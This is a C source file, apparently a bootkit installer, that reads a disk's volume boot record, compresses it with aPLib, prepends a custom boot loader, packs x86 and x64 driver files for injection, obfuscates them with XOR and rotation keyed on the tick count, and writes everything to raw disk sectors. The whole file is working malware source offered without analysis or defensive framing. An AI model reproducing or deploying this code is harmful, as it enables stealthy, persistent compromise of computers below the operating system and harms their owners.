#include "ChangeDiskSector.h"

ULONG __stdcall ApPack(PCHAR SrcBuffer,ULONG SrcLen,PCHAR* pDstBuffer)
{
	ULONG wLen,pLen,PackedLen = 0;
	PCHAR Packed = NULL,WorkSet = NULL;

	wLen = aP_workmem_size(SrcLen);
	pLen = aP_max_packed_size(SrcLen);

	do 
	{
		Packed = VirtualAlloc(NULL, \
			wLen + pLen, \
			MEM_COMMIT | MEM_RESERVE, \
			PAGE_READWRITE);
	} while (NULL == Packed);
	RtlZeroMemory(Packed,pLen);

	WorkSet = Packed + pLen;
	if (PackedLen = aP_pack(SrcBuffer,Packed,SrcLen,WorkSet,NULL,NULL))
	{
		*pDstBuffer = Packed;
	}
	else
	{
		VirtualFree(Packed,0,MEM_RELEASE);
	}
	return PackedLen;
}
BOOLEAN __stdcall CreateLoader2(PCHAR pBootLoader, \
								ULONG ulBootSize, \
								PCHAR pOriginal, \
								ULONG ulOriginalSize, \
								PCHSS pTargetChssAddr)
{
	BOOLEAN bRet;
	ULONG ulPackedSize;
	PCHAR pPacked;
	ULONG uli;
	//ULONG ulC;
	//USHORT XorValue;
	ULONG ulCount;

	bRet = FALSE;
	ulCount = 0;
	pPacked = NULL;
#define _COMPRESSION
#ifndef _COMPRESSION
	for (uli = 0;uli < ulOriginalSize;uli++)
	{
		if (pOriginal[uli] == '\0')
		{
			ulCount++;
			if (ulCount >= 0x100)
			{
				uli = uli - 0x100;
				break;
			}
		}
		else
		{
			ulCount = 0;
		}
	}
	ulPackedSize = ulOriginalSize - (ulOriginalSize - uli);
	do 
	{
		pPacked = VirtualAlloc(NULL,ulPackedSize,MEM_RESERVE | MEM_COMMIT,PAGE_READWRITE);
	} while (NULL == pPacked);
	RtlZeroMemory(pPacked,ulPackedSize);
	RtlCopyMemory(pPacked,pOriginal,ulPackedSize);
	if (ulPackedSize + ulBootSize < ulOriginalSize)
	{
		memcpy(pOriginal,pBootLoader,ulBootSize);
		for (uli = 0;uli < ulBootSize;uli++)
		{
			if (pOriginal[uli] == (CHAR)BK_NAME_MAGIC && (*(PULONG)(&pOriginal[uli]) == BK_NAME_MAGIC))
			{
				break;
			}
		}
		if (uli < ulBootSize)
		{
			//XorValue = *(PUSHORT)(&pOriginal[uli] + sizeof(ULONG));
			memcpy(&pOriginal[uli],pTargetChssAddr,sizeof(CHSS));
			// Xoring file address and size structure
			//for (ulC = 0;ulC < (sizeof(CHSS) / 2);ulC++)
			//{
			//	*((PUSHORT)&pOriginal[uli] + ulC) ^= XorValue;
			//}
			memcpy(pOriginal + ulBootSize,pPacked,ulPackedSize);
			RtlZeroMemory(pOriginal + ulBootSize + ulPackedSize,ulOriginalSize - ulBootSize - ulPackedSize);
			bRet = TRUE;
		}
	}
	VirtualFree(pPacked,0,MEM_RELEASE);
#else
	if (ulPackedSize = ApPack(pOriginal,ulOriginalSize,&pPacked))
	{
		RtlZeroMemory(pOriginal,ulOriginalSize);
		if ((ulBootSize + ulPackedSize) <= ulOriginalSize)
		{
			memcpy(pOriginal,pBootLoader,ulBootSize);
			for (uli = 0;uli < ulBootSize;uli++)
			{
				if (pOriginal[uli] == (CHAR)BK_NAME_MAGIC && (*(PULONG)(&pOriginal[uli]) == BK_NAME_MAGIC))
				{
					break;
				}
			}
			if (uli < ulBootSize)
			{
				//XorValue = *(PUSHORT)(&pOriginal[uli] + sizeof(ULONG));
				//pTargetChssAddr->ulXorValue = XorValue;

				memcpy(&pOriginal[uli],pTargetChssAddr,sizeof(CHSS));		

				// Xoring file address and size structure
				//for (ulC = 0;ulC < (sizeof(CHSS) / 2);ulC++)
				//{
				//	*((PUSHORT)&pOriginal[uli] + ulC) ^= XorValue;
				//}
				memcpy(pOriginal + ulBootSize,pPacked,ulPackedSize);
				//RtlZeroMemory(pOriginal + ulBootSize + ulPackedSize,ulOriginalSize - ulBootSize - ulPackedSize);
				bRet = TRUE;
			}
		}
		VirtualFree(pPacked,0,MEM_RELEASE);
	}
#endif
	return bRet;
}
int WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,PCHAR pCmdLine,int nCmdShow)
{
	HANDLE hDisk;
	HANDLE hVbr;
	PCHAR pVbrDat;
	PCHAR pBootCode;
	ULONG ulVbrSize;
	ULONG ulBootCodeSize;
	ULONG ulRetBytesSize;
	CHSS BkChss;
	ULONG ulError;
	LDRDRV x86LdrDrv;
	LDRDRV x64LdrDrv;
	PCHAR pInjectX86Sys;
	PCHAR pInjectX64Sys;
	ULONG ulX86SysSize;
	ULONG ulX64SysSize;
	ULONG ulTotalSize;
	PCHAR pSysDat;
	ULONG ulSize;
	ULONG uli;
	ULONG ulXored;
	UCHAR ShiftRor;

	pVbrDat = NULL;
	pBootCode = NULL;
	ulVbrSize = 0;
	ulBootCodeSize = 0;
	ulRetBytesSize = 0;
	ulError = 0;
	pInjectX86Sys = NULL;
	pInjectX64Sys = NULL;
	ulX86SysSize = 0;
	ulX64SysSize = 0;
	ulTotalSize = 0;
	pSysDat = NULL;
	ulSize = 0;
	ulXored = 0;
	

	switch (__argc)
	{
	case 6:
		if (GetFileDat(__argv[4],&pInjectX86Sys,&ulX86SysSize) && \
			GetFileDat(__argv[5],&pInjectX64Sys,&ulX64SysSize))
		{
			ulTotalSize = sizeof(LDRDRV) * 3 + ulX86SysSize + ulX64SysSize;
			if (ulTotalSize % 0x200)
			{
				ulTotalSize = ((ulTotalSize / 0x200) + 1) * 0x200;
			}
			do 
			{
				pSysDat = VirtualAlloc(NULL,ulTotalSize,MEM_RESERVE | MEM_COMMIT,PAGE_READWRITE);
			} while (NULL == pSysDat);
			RtlZeroMemory(pSysDat,ulTotalSize);

			x86LdrDrv.ulSignature = 'XD86';
			x86LdrDrv.ulLength = ulX86SysSize;
			x86LdrDrv.ulOffset = sizeof(x86LdrDrv) * 3;
			x86LdrDrv.ulXor = 0;

			x64LdrDrv.ulSignature = 'XD64';
			x64LdrDrv.ulLength = ulX64SysSize;
			x64LdrDrv.ulOffset = sizeof(LDRDRV) * 3 + ulX86SysSize;
			x64LdrDrv.ulXor = 0;
			RtlCopyMemory(pSysDat,&x86LdrDrv,sizeof(LDRDRV));
			RtlCopyMemory((PCHAR)((ULONG)pSysDat + sizeof(LDRDRV)),&x64LdrDrv,sizeof(LDRDRV));
			RtlCopyMemory((PCHAR)((ULONG)pSysDat + sizeof(LDRDRV) * 3),pInjectX86Sys,ulX86SysSize);
			RtlCopyMemory((PCHAR)((ULONG)pSysDat + sizeof(LDRDRV) * 3 + ulX86SysSize),pInjectX64Sys,ulX64SysSize);

		}
		if (GetFileDat(__argv[2],&pBootCode,&ulBootCodeSize))
		{
			hVbr = CreateFileA(__argv[3], \
				FILE_ALL_ACCESS, \
				FILE_SHARE_READ, \
				NULL, \
				OPEN_EXISTING, \
				FILE_ATTRIBUTE_NORMAL, \
				NULL);
			if (INVALID_HANDLE_VALUE == hVbr)
			{
				return 0;
			}
			ulVbrSize = 0x2000 - 0x27A;
			do 
			{
				pVbrDat = VirtualAlloc(NULL,ulVbrSize,MEM_RESERVE | MEM_COMMIT,PAGE_READWRITE);
			} while (NULL == pVbrDat);
			RtlZeroMemory(pVbrDat,ulVbrSize);
			SetFilePointer(hVbr,0x27A,NULL,FILE_BEGIN);
			if (FALSE == ReadFile(hVbr,pVbrDat,ulVbrSize,&ulRetBytesSize,NULL))
			{
				ulError = GetLastError();
				MessageBoxA(NULL,"Read Vbr Failed",NULL,MB_OK);
			}
			RtlZeroMemory(&BkChss,sizeof(CHSS));
			BkChss.lStartSector.QuadPart = 0x0B;
			BkChss.uNumberSectors = ulTotalSize / 0x400;
			BkChss.ulXorValue = GetTickCount();
			if (!CreateLoader2(pBootCode,ulBootCodeSize,pVbrDat,ulVbrSize,&BkChss))
			{
				MessageBoxA(NULL,"CreateLoader2() Failed",NULL,MB_OK);
			}
			hDisk = CreateFileA(__argv[1], \
				FILE_ALL_ACCESS, \
				FILE_SHARE_READ, \
				NULL, \
				OPEN_EXISTING, \
				FILE_ATTRIBUTE_NORMAL, \
				NULL);
			if (INVALID_HANDLE_VALUE == hDisk)
			{
				return 0;
			}
			ulSize = ulTotalSize / sizeof(ULONG);
			ShiftRor = ulSize;
			for (uli = 0;uli < (ulTotalSize / sizeof(ULONG));uli++)
			{
				ulXored = ((PULONG)pSysDat)[uli];
				ulXored = _rotl((ulXored + ulSize) ^ BkChss.ulXorValue,ShiftRor);
				((PULONG)pSysDat)[uli] = ulXored;
				ulSize -= 1;
			}
			SetFilePointer(hDisk,0x1600,NULL,FILE_BEGIN);
			if (FALSE == WriteFile(hDisk,pSysDat,ulTotalSize,&ulRetBytesSize,NULL))
			{
				MessageBoxA(NULL,"Write Sector Failed,Offset:0x1600",NULL,MB_OK);
			}
			SetFilePointer(hDisk,0x10027A,NULL,FILE_BEGIN);
			if (FALSE == WriteFile(hDisk,pVbrDat,ulVbrSize,&ulRetBytesSize,NULL))
			{
				MessageBoxA(NULL,"Write Sector Failed,Offset:0x10027A",NULL,MB_OK);
			}
			//SetFilePointer(hDisk,0x650027A,NULL,FILE_BEGIN);
			//if (FALSE == WriteFile(hDisk,pVbrDat,ulVbrSize,&ulRetBytesSize,NULL))
			//{
			//	MessageBoxA(NULL,"Write Sector Failed,Offset:0x650027A",NULL,MB_OK);
			//}
			if (hDisk)
			{
				CloseHandle(hDisk);
			}
			if (hVbr)
			{
				CloseHandle(hVbr);
			}
			if (pVbrDat)
			{
				VirtualFree(pVbrDat,ulVbrSize,MEM_RESERVE);
				pVbrDat = NULL;
			}
		}
		break;
	default:
		break;
	}
	return 0;
}
BOOLEAN GetFileDat(PCHAR pFileName,PCHAR* pDat,PULONG ulSize)
{
	BOOLEAN bRet;
	HANDLE hFile;
	ULONG ulRetBytesSize;
	LARGE_INTEGER lSize;

	bRet = FALSE;
	lSize.QuadPart = 0;

	do 
	{
		hFile = CreateFileA(pFileName, \
			FILE_READ_ACCESS, \
			FILE_SHARE_READ | FILE_SHARE_WRITE, \
			NULL, \
			OPEN_EXISTING, \
			FILE_ATTRIBUTE_NORMAL, \
			NULL);
		if (INVALID_HANDLE_VALUE == hFile)
		{
			break;
		}
		bRet = GetFileSizeEx(hFile,&lSize);
		if (FALSE == bRet)
		{
			break;
		}
		*pDat = VirtualAlloc(NULL,lSize.LowPart,MEM_RESERVE | MEM_COMMIT,PAGE_READWRITE);
		if (NULL == *pDat)
		{
			break;
		}
		RtlZeroMemory(*pDat,lSize.LowPart);
		*ulSize = lSize.LowPart;
		bRet = ReadFile(hFile,*pDat,lSize.LowPart,&ulRetBytesSize,NULL);
		if (FALSE == bRet)
		{
			break;
		}
		bRet = TRUE;
	} while (0);
	if (hFile)
	{
		CloseHandle(hFile);
	}
	return bRet;
}
